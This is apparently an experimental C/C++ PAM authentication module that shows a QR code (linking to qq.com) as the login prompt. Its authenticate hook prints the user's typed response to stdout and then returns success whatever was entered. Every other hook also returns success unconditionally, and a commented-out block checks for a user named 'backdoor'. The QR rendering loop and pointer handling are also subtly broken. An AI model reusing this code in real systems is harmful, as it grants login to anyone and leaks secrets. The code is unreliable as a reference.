#include <stdlib.h>
#include <string.h>
#include <syslog.h>
#include <stdio.h>
#define PAM_SM_AUTH
#define PAM_SM_ACCOUNT
#define PAM_SM_SESSION
#define PAM_SM_PASSWORD
#include <security/pam_modules.h>
#include "qrencode.h"
#include <string>


int create_qr_code(const char *str, std::string & sqrcode)
{
    QRcode *qrcode=QRcode_encodeString(str, 0, QR_ECLEVEL_H, QR_MODE_8, 1);
    sqrcode = "";
    for (size_t i = 0; i < 25; ++ i) {
        for (size_t j = 0; j < 25; ++ j) {
            if(qrcode->data[i*25+j]&0x01) {
                sqrcode += " ";
                printf("#");
            } else {
                sqrcode += "\033[47m\n \033[0m";
                printf("_");
            }
            sqrcode += "\n";
            printf("\n");
        }
    }
    return 0;
}

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
    printf("setcred\n");
    return PAM_SUCCESS ;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
    printf("auth0\n");
    const struct pam_conv *conv;
    struct pam_message resp_message;
    const struct pam_message *msg[1];
    struct pam_response *presp;
    resp_message.msg_style = PAM_PROMPT_ECHO_OFF;  
    std::string sqrcode;
    create_qr_code("http://www.qq.com", sqrcode);
    //resp_message.msg = "come on:\033[47m\n   \033[0m   \033[47m   \033[0m";  
    resp_message.msg = sqrcode.c_str();
    msg[0] = &resp_message; 
    int retval = pam_get_item(pamh, PAM_CONV, (const void **)&conv);
    printf("retVal get_conv : %d\n", retval);
    printf("presp hex : %p\n", presp);
    retval = conv->conv(1, msg, &presp, conv->appdata_ptr);
    printf("presp 1 hex : %p\n", presp);
    printf("retVal conv : %d\n", retval);
    printf("resp->resp : %s\n", presp->resp);
    free(presp->resp);
    free(presp);
    //free(resp);
    //const char* pUsername;
    //retval = pam_get_user(pamh, (const char**)&pUsername, "TUsername: ");
    //printf("name0 : %s\n", pUsername);
    //if (retval != PAM_SUCCESS) {
    //    printf("name1 : %s\n", pUsername);
    //    return retval;
    //}
    //if (strcmp(pUsername, "backdoor") != 0) {
    //    printf("name2 : %s\n", pUsername);
    //    return PAM_AUTH_ERR;
    //}
    printf("auth\n");
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh,int flags,int argc ,const char **argv)
{
    printf("mgmt\n");
    return PAM_SUCCESS;
}
PAM_EXTERN int pam_sm_chauthtok(pam_handle_t *pamh,int flags,int argc ,const char **argv)
{
    printf("tok\n");
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_open_session(pam_handle_t *pamh,int flags,int argc ,const char **argv)
{
    printf("opsession\n");
    return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_close_session(pam_handle_t *pamh,int flags,int argc, const char **argv)
{
    printf("closesession\n");
    return PAM_SUCCESS;
}
